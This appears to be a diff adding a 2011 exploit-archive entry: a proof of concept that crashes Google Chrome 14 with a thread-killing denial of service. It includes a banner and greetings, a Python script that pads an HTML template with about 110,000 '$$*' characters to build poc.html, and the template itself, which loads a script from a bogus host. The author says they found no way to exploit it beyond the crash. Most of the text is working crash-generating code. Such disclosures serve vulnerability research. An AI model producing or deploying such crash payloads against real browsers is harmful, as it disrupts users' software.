@@ -1,0 +1,57 @@
+## _  (`-')  _   pigtail23   (`-')     (`-')  _   _           www.remoteshell.de ##
+## \-.(OO ) (_)        .->   ( OO).->  (OO ).-/  (_)      <-.                    ##
+## _.'    \ ,-(`-') ,---(`-')/    '._  / ,---.   ,-(`-'),--. )   .----.  .----.  ##
+##(_...--'' | ( OO)'  .-(OO )|'--...__)| \ /`.\  | ( OO)|  (`-')\_,-.  |\_.-,  | ##
+##|  |_.' | |  |  )|  | .-, \`--.  .--''-'|_.' | |  |  )|  |OO )   .' .'  |_  <  ##
+##|  .___.'(|  |_/ |  | '.(_/   |  |  (|  .-.  |(|  |_/(|  '__ | .'  /_ .-. \  | ##
+##|  |      |  |'->|  '-'  |    |  |   |  | |  | |  |'->|     |'|      |\ `-'  / ##
+##`--'      `--'    `-----'     `--'   `--' `--' `--'   `-----' `------' `---''  ##
+###################################################################################
+###################################################################################
+October 22, 2011
+
+Ohh nice! What u doing google? Thx 4 ur bug! 0__o
+
+Google Chrome PoC, killing thread. Exploitable or only a DOS!? Found no way to exploit it. Good Luck!!!
+
+Testsystem: WinXP SP3, Win7(64 bit)
+Google Chrome version: 14.0.835.202
+
+Greetings to:
+mr_insecure, myownremote, noptrix, Eph, lnxg33k, CyberMaN,...
+TheXero, Dexter, #back-track.de and #intern0t @ irc.freenode.net
+
+###################################################################################
+
+poc.html:
+
+too big!
+
+###################################################################################
+
+Python script for debugging:
+
+#!/usr/bin/python
+
+filename = 'poc.html'
+content = open('template.html', 'r').read()
+
+buff = '$$*' * 36800 
+
+rc = 484
+content2 = content[:rc] + buff + content[rc:]	
+
+FILE = open(filename,"w")
+FILE.write(content2)
+FILE.close()
+
+###################################################################################
+
+
+template.html:
+
+<html>
+<body>
+<script>(function(){var d=document;if(!("autofocus" in d.createElement("input"))){try{d.getElementById("yschsp").focus();}catch(e){}}data={"assist":{"url":"http:\/\/www.google.com","maxLength":38,"linkStem":"http:\/\/www.remoteshell.de","settingsUrl":"http:\/\/www.chrooome.xxx","strings":{"searchbox_title":"bam","settings_text":"bam","gossip_desc":"bam","scroll_up":"bam","scroll_down":"bam","aria_available_suggestions":"bam","aria_no_suggestion_available":"bam"}}};window.onload=function(){var h=d.getElementsByTagName("head")[0],o=d.createElement("script");o.src="http://www.0__o";h.appendChild(o);};}());</script>
+</body>
+</html>
